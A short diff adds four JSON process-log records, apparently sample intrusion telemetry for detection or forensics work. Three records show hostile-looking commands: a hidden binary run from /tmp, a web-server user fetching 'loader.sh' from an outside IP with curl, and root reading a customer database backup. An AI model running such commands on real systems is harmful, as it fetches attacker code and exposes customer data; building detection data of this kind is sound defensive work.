@@ -1,0 +1,4 @@
+{"seq":5000,"ts":"2026-06-10T02:12:01Z","host":"edge-1","pid":4210,"user":"backup","cmd":"/tmp/.p --stage"}
+{"seq":5001,"ts":"2026-06-10T02:28:30Z","host":"web-2","pid":3133,"user":"www-data","cmd":"/bin/sh -c curl http://198.51.100.77/loader.sh"}
+{"seq":5002,"ts":"2026-06-10T02:36:00Z","host":"db-3","pid":881,"user":"root","cmd":"cat /var/backups/customer.db"}
+{"seq":5003,"ts":"2026-06-10T02:06:00Z","host":"edge-1","pid":299,"user":"svc-metrics","cmd":"/usr/bin/node exporter.js"}
